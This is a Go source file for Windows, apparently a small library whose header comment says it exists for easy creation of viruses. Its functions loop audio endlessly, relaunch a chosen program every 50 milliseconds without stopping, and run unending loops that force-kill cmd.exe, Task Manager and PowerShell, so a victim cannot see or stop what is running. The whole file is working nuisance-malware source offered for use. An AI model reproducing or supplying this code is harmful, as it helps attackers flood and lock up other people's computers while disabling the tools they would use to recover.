// +build windows

//Package viruz allows for easy creation of viruses
package viruz

import (
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/faiface/beep"
	"github.com/faiface/beep/mp3"
	"github.com/faiface/beep/speaker"
	"github.com/faiface/beep/wav"
)

//PlayAudio - Plays specified audio
func PlayAudio(song string, repeat bool) error {
	//Checking for mp3 or wav format
	var audiotype bool
	if !strings.HasSuffix(song, ".wav") {
		audiotype = true
	}

	//Retrieving audio asset
	var errReturn error
	f, err := os.Open(song)
	if err != nil {
		errReturn = err
	}

	//Playing audio
	if repeat { //Looping audio
		for {
			var (
				s      beep.StreamSeekCloser
				format beep.Format
				err    error
			)
			if audiotype {
				s, format, err = mp3.Decode(f)
			} else {
				s, format, err = wav.Decode(f)
			}
			if err != nil {
				errReturn = err
			}
			speaker.Init(format.SampleRate, format.SampleRate.N(time.Second/10))
			done := make(chan struct{})
			speaker.Play(beep.Seq(s, beep.Callback(func() {
				close(done)
			})))
			<-done
		}
	} else { //Playing audio once
		var (
			s      beep.StreamSeekCloser
			format beep.Format
			err    error
		)
		if audiotype {
			s, format, err = mp3.Decode(f)
		} else {
			s, format, err = wav.Decode(f)
		}
		if err != nil {
			errReturn = err
		}
		speaker.Init(format.SampleRate, format.SampleRate.N(time.Second/10))
		done := make(chan struct{})
		speaker.Play(beep.Seq(s, beep.Callback(func() {
			close(done)
		})))
		<-done
	}
	return errReturn
}

//Begin - Starting specified program
func Begin(program string, param string, repeat bool) error {
	var errReturn error
	go func() {
		if repeat { //Repeatedly starting program
			for {
				go func() {
					if param == "" {
						err := exec.Command(program).Start()
						if err != nil {
							errReturn = err
						}
					} else { //Starting program with parameters
						err := exec.Command(program, param).Start()
						if err != nil {
							errReturn = err
						}
					}
				}()
				time.Sleep(time.Millisecond * 50)
			}
		} else { //Starting program once
			go func() {
				if param == "" {
					err := exec.Command(program).Start()
					if err != nil {
						errReturn = err
					}
				} else { //Starting program with parameters
					err := exec.Command(program, param).Start()
					if err != nil {
						errReturn = err
					}
				}
			}()
		}
	}()
	return errReturn
}

//KillProcs - Concurrently killing processes
func KillProcs() error {
	var errReturn error
	go func() {
		for {
			err := exec.Command("taskkill", "/f", "/im", "cmd.exe").Start()
			if err != nil {
				errReturn = err
			}
		}
	}()
	go func() {
		for {
			err := exec.Command("taskkill", "/f", "/im", "taskmgr.exe").Start()
			if err != nil {
				errReturn = err
			}
		}
	}()
	go func() {
		for {
			err := exec.Command("taskkill", "/f", "/im", "powershell.exe").Start()
			if err != nil {
				errReturn = err
			}
		}
	}()
	return errReturn
}
